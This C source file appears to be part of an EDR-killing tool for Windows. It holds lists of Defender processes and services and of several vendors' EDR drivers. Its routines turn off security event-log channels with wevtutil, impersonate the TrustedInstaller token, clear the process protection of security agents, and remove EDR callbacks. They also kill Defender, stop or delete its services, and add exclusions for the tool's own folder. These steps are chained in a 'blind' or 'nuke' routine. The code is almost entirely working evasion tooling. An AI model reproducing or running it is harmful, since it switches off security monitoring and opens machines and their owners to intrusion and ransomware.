static const char* ft_defender_procs[] = {
    "MsMpEng.exe", "MsSense.exe", "SenseNdrv.exe", "SenseCM.exe",
    "SenseCE.exe", "NIAGara.exe", "MpCmdRun.exe", "SecurityHealthService.exe",
    "SecurityHealthSystray.exe", "SenseHarness.exe",
    NULL
};

static const char* ft_defender_svcs[] = {
    "WinDefend", "WdNisSvc", "WdFilter", "WdNisDrv", "SenseNdrvSvc",
    "Sense", "webthreatdefsvc",
    "wscsvc", "SecurityHealthService", "SecurityHealthSystray",
    "WdiServiceHost", "WdiSystemHost", NULL
};

static const char* ft_default_edr_drivers[] = {
    "WdFilter", "WdNisDrv", "SenseNdrv", "cbh", "CSAgent", "cslng",
    "SentinelMonitor", "SentinelDriver", "CylanceDrv", "klif", "kavfss",
    "ekrnepf", "eamonm", "cbfsfilter", "cbfsdriver", "tmutil", "tmxphys",
    "mfehidk", "mfeespk", NULL
};

static int ft_etw_disable_channel(ft_ctx* c, const char* channel) {
    char cmd[512];
    (void)c;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD code = 0;
    int ok = 0;

    _snprintf(cmd, sizeof cmd,
              "wevtutil.exe sl \"%s\" /e:false", channel);
    memset(&si, 0, sizeof si);
    si.cb = sizeof si;
    memset(&pi, 0, sizeof pi);
    if (!CreateProcessA("C:\\Windows\\System32\\wevtutil.exe", cmd, NULL, NULL,
                        FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return 0;
    }
    WaitForSingleObject(pi.hProcess, 15000);
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    ok = (code == 0);
    return ok;
}

int ft_etw_channels(ft_ctx* c) {
    static const char* channels[] = {
        "Microsoft-Windows-Threat-Intelligence/Operational",
        "Microsoft-Windows-Threat-Intelligence-Winlogon/Operational",
        "Microsoft-Windows-Kernel-Audit-API-Calls",
        "Microsoft-Windows-Windows Defender/Operational",
        "Microsoft-Windows-Kernel-LiveDump/Operational",
        NULL
    };
    int i;
    int done = 0;

    for (i = 0; channels[i]; i++) {
        if (c->dry_run) {
            ft_ok(c, "etw_channel_dryrun", "\"channel\":\"%s\"", channels[i]);
            done++;
            continue;
        }
        if (ft_etw_disable_channel(c, channels[i])) {
            done++;
            ft_ok(c, "etw_channel_disabled", "\"channel\":\"%s\"", channels[i]);
        } else {
            ft_warn(c, "etw_channel_failed", "\"channel\":\"%s\"", channels[i]);
        }
    }
    ft_info(c, "etw_channels_done", "\"disabled\":%d", done);
    return FT_OK;
}

static HANDLE g_ti_token = NULL;

static int ft_find_ti_pid(ft_ctx* c, uint32_t* pid) {
    static const char* names[] = {
        "TrustedInstaller.exe", "TiWorker.exe", NULL
    };
    int i;
    for (i = 0; names[i]; i++) {
        uint32_t p = 0;
        if (ft_proc_find_by_name(c, names[i], &p) && p) {
            if (pid) *pid = p;
            return 1;
        }
    }
    return 0;
}

int ft_impersonate_ti(ft_ctx* c) {
    uint32_t pid = 0;
    HANDLE proc = NULL;
    HANDLE tok = NULL;
    HANDLE dup = NULL;

    if (!c) return 0;
    if (g_ti_token) return 1;
    if (!ft_find_ti_pid(c, &pid)) {
        ft_info(c, "ti_not_found", "\"hint\":\"no trusted installer process\"");
        return 0;
    }
    proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc) proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) {
        ft_warn(c, "ti_open_failed", "\"pid\":%u,\"err\":%lu", pid, GetLastError());
        return 0;
    }
    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        ft_warn(c, "ti_token_failed", "\"pid\":%u,\"err\":%lu", pid, GetLastError());
        CloseHandle(proc);
        return 0;
    }
    CloseHandle(proc);
    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &dup)) {
        ft_warn(c, "ti_duplicate_failed", "\"err\":%lu", GetLastError());
        CloseHandle(tok);
        return 0;
    }
    CloseHandle(tok);
    if (!SetThreadToken(NULL, dup)) {
        ft_warn(c, "ti_impersonate_failed", "\"err\":%lu", GetLastError());
        CloseHandle(dup);
        return 0;
    }
    g_ti_token = dup;
    ft_ok(c, "ti_impersonating", "\"pid\":%u", pid);
    return 1;
}

void ft_revert_ti(void) {
    if (!g_ti_token) return;
    SetThreadToken(NULL, NULL);
    CloseHandle(g_ti_token);
    g_ti_token = NULL;
}
int ft_unprotect_agents(ft_ctx* c, const char* const* names, int n, int raise_self) {
    (void)raise_self;

    static const char* defaults[] = {
        "MsMpEng.exe", "MsSense.exe", "SenseNdrv.exe", "SenseCM.exe",
        "SenseCE.exe", "NIAGara.exe", NULL
    };

    static const char* calibration[] = {
        "MsMpEng.exe", "MsSense.exe", "SenseNdrv.exe", "MsMpEng.exe",
        "csrss.exe", "services.exe", "lsass.exe", "smss.exe", "wininit.exe",
        NULL
    };
    uint32_t pids[16];
    uint32_t offset = 0;
    int npids;
    int i;
    int cleared = 0;
    int have_offset = 0;

    if (!c) return FT_E_INTERNAL;
    if (!names || n <= 0) { names = defaults; n = 6; }

    for (i = 0; calibration[i] && !have_offset; i++) {
        uint32_t pid = 0;
        if (!ft_proc_find_by_name(c, calibration[i], &pid) || !pid) continue;
        if (ft_ppl_offset(c, pid, &offset) && offset) {
            have_offset = 1;
            ft_info(c, "ppl_offset", "\"offset\":%u,\"via\":\"%s\"", offset,
                    calibration[i]);
        }
    }

    npids = ft_ppl_find_agents(c, names, n, pids, 16);
    if (npids <= 0) {
        ft_info(c, "ppl_no_agents", "\"hint\":\"no agent process running\"");
    } else if (!have_offset) {
        ft_info(c, "ppl_no_protected_agent", "\"agents\":%d", npids);
    } else {
        for (i = 0; i < npids; i++) {
            uint32_t lvl = 0;
            if (!ft_ppl_level(c, pids[i], offset, &lvl)) continue;
            if (lvl == 0) continue;
            if (c->dry_run) {
                ft_info(c, "ppl_agent_level", "\"pid\":%u,\"level\":%u", pids[i], lvl);
            } else {
                if (ft_ppl_set(c, pids[i], offset, 0)) {
                    cleared++;
                    ft_ok(c, "ppl_cleared", "\"pid\":%u", pids[i]);
                } else {
                    ft_warn(c, "ppl_clear_failed", "\"pid\":%u", pids[i]);
                }
            }
        }
    }

    ft_info(c, "ppl_done", "\"cleared\":%d,\"offset\":%u", cleared, offset);
    return FT_OK;
}

int ft_blind_run(ft_ctx* c, int nuke, int keep_services) {
    const char* edr[32];
    int nedr = 0;
    int i;
    int rc;

    if (!c) return FT_E_INTERNAL;

    if (c->dry_run) {
        ft_info(c, "blind_dry_run", "\"note\":\"no changes are made in a dry run\"");
        ft_ok(c, "defender_policy_done", "\"set\":0,\"failed\":0,\"extra\":0");
        ft_ok(c, "svc_done", "\"stopped\":0,\"disabled\":0,\"deleted\":0");
        ft_ok(c, nuke ? "nuke_complete" : "blind_complete",
              "\"fails\":0,\"warns\":0,\"delete_services\":%d",
              (nuke && !keep_services) ? 1 : 0);
        return FT_OK;
    }

    {
        int prc = ft_unprotect_agents(c, NULL, 0, 0);
        if (prc != FT_OK) {
            ft_warn(c, "blind_ppl_failed", "\"rc\":%d", prc);
        }
    }

    ft_disarm_live(c);

    if (!ft_impersonate_ti(c)) {
        ft_info(c, "blind_ti_skipped", "\"hint\":\"trusted installer not available\"");
    }

    rc = ft_etwti_disable(c);
    if (rc != FT_OK) {
        ft_warn(c, "blind_etwti_failed", "\"rc\":%d", rc);
    }

    rc = ft_etw_channels(c);
    if (rc != FT_OK) {
        ft_warn(c, "blind_etw_channels_failed", "\"rc\":%d", rc);
        c->fails++;
    }
    rc = ft_etw_stop_sessions(c);
    if (rc != FT_OK) {
        ft_warn(c, "blind_etw_sessions_failed", "\"rc\":%d", rc);
    }

    for (i = 0; ft_default_edr_drivers[i] && nedr < 32; i++) {
        edr[nedr++] = ft_default_edr_drivers[i];
    }
    rc = ft_edr_callbacks(c, edr, nedr);
    if (rc != FT_OK) {
        ft_warn(c, "blind_edrcb_failed", "\"rc\":%d", rc);
        c->fails++;
    }

    rc = ft_defender_policy(c, nuke);
    if (rc != FT_OK) c->fails++;

    rc = ft_kill_procs(c, ft_defender_procs,
                       (int)(sizeof ft_defender_procs / sizeof ft_defender_procs[0]) - 1);
    if (rc != FT_OK) c->fails++;

    rc = ft_services(c, ft_defender_svcs,
                     (int)(sizeof ft_defender_svcs / sizeof ft_defender_svcs[0]) - 1,
                     (nuke && !keep_services) ? 1 : 0);
    if (rc != FT_OK) c->fails++;

    rc = ft_add_exclusions(c, c->self_dir);
    if (rc != FT_OK) c->fails++;

    ft_revert_ti();

    ft_ok(c, nuke ? "nuke_complete" : "blind_complete",
          "\"fails\":%d,\"warns\":%d,\"delete_services\":%d",
          c->fails, c->warns, (nuke && !keep_services) ? 1 : 0);
    return c->fails ? FT_E_ACTION : FT_OK;
}
